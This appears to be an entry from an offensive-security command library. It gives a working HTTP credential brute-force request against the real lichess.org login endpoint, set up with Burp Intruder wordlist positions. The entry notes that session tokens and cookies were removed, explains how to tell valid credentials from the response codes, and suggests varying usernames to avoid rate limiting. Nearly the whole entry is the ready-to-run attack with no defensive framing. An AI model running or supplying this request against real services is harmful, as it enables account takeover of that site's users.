---
data: >-
  POST /login HTTP/2

  Host: lichess.org

  Content-Length: 343

  Cache-Control: max-age=0

  Sec-Ch-Ua-Platform: "Linux"

  X-Requested-With: XMLHttpRequest

  Accept-Language: en-US,en;q=0.9

  Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"

  Content-Type: multipart/form-data;
  boundary=----WebKitFormBoundaryc5GZocBapliqt011

  Sec-Ch-Ua-Mobile: ?0

  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36

  Accept: */*

  Origin: https://lichess.org

  Sec-Fetch-Site: same-origin

  Sec-Fetch-Mode: cors

  Sec-Fetch-Dest: empty

  Referer: https://lichess.org/login

  Accept-Encoding: gzip, deflate, br

  Priority: u=1, i


  ------WebKitFormBoundaryc5GZocBapliqt011

  Content-Disposition: form-data; name="username"


  §username§

  ------WebKitFormBoundaryc5GZocBapliqt011

  Content-Disposition: form-data; name="password"


  §password§

  ------WebKitFormBoundaryc5GZocBapliqt011

  Content-Disposition: form-data; name="remember"


  true

  ------WebKitFormBoundaryc5GZocBapliqt011--
tags:
  - brute-force
  - http-request
type: command
output: 200 OK for valid credentials; 401 Unauthorized for invalid
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:49.056Z'
id: aa1c242e-ffa8-4188-894d-39d46d5ec566
verified: false
validated: true
submitted: true
---
# lichess-login-brute-force-request

## Command

```http
POST /login HTTP/2
Host: lichess.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc5GZocBapliqt011

------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="username"

§username§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="password"

§password§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="remember"

true
------WebKitFormBoundaryc5GZocBapliqt011--
```

## Description

This HTTP POST request targets the Lichess login endpoint for brute force testing, with payload positions for username and password to facilitate wordlist injection in tools like Burp Intruder. Used after modifying a captured legitimate request to remove tokens and cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| username | Payload position for username wordlist; replace §username§ with actual value | Yes |
| password | Payload position for password wordlist; replace §password§ with actual value | Yes |
| remember | Set to 'true' for persistent session; fixed value | Yes |
| boundary | Form boundary string; can be customized but must match Content-Type | Yes |

## Examples

### Basic Usage

Replace placeholders for a single test:

```http
POST /login HTTP/2
Host: lichess.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc5GZocBapliqt011

------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="username"

testuser
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="password"

testpass
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="remember"

true
------WebKitFormBoundaryc5GZocBapliqt011--
```

### Advanced Usage

In Burp Intruder, positions automate replacements with wordlists.

## Expected Output

- 200 OK with session data for valid credentials, indicating successful login.
- 401 Unauthorized with error message for invalid attempts.
- No 429 rate limit errors if using varied usernames.

## Related

- [[procedures/Capture-and-Modify-Login-Request-with-Burp]]
- [[procedures/Configure-Burp-Intruder-for-Brute-Force]]
